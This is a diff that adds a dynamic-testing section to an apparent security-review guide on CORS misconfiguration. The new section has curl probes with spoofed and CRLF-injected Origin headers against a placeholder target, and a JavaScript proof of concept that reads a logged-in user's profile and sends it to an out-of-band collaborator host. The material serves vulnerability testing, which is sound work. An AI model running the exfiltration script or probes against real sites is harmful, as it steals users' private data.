@@ -70,6 +70,36 @@ Commonly affected languages: JavaScript, Java, Python, Go. No standard CORS conf
 - **VULN**: Filter setting `Access-Control-Allow-Origin` from request header when credentials allowed
 - **SAFE**: hardcoded origin or whitelist set membership before header write
 
+## Dynamic Test / PoC
+
+**Origin reflection** — inspect response headers for echoed `Access-Control-Allow-Origin`:
+
+```bash
+curl -s -H 'Origin: https://evil.com' 'https://TARGET/api/endpoint' -D- | grep -i access-control
+```
+
+**Bypass probes** (when whitelist uses prefix/substring matching):
+
+```bash
+curl -s -H 'Origin: https://TARGET.evil.com' 'https://TARGET/api/endpoint' -D-
+curl -s -H 'Origin: null' 'https://TARGET/api/endpoint' -D-
+curl -s -H 'Origin: http://TARGET' 'https://TARGET/api/endpoint' -D-
+curl -s -H 'Origin: https://TARGET%60.evil.com' 'https://TARGET/api/endpoint' -D-
+curl -s -H 'Origin: https://TARGET_.evil.com' 'https://TARGET/api/endpoint' -D-
+curl -s -H 'Origin: https://evil.com%0d%0a' 'https://TARGET/api/endpoint' -D-
+curl -s -H 'Origin: https://evil-TARGET' 'https://TARGET/api/endpoint' -D-
+```
+
+**Impact confirmation** — when ACAO reflects attacker origin **and** `Access-Control-Allow-Credentials: true`:
+
+```html
+<script>
+fetch('https://TARGET/api/user/profile', { credentials: 'include' })
+  .then(r => r.json())
+  .then(d => fetch('https://YOUR-COLLABORATOR.oast.fun/?data=' + btoa(JSON.stringify(d))));
+</script>
+```
+
 ## Common False Alarms
 
 - Public read-only API with `Access-Control-Allow-Origin: *` and **no** credentials — intentional public CORS
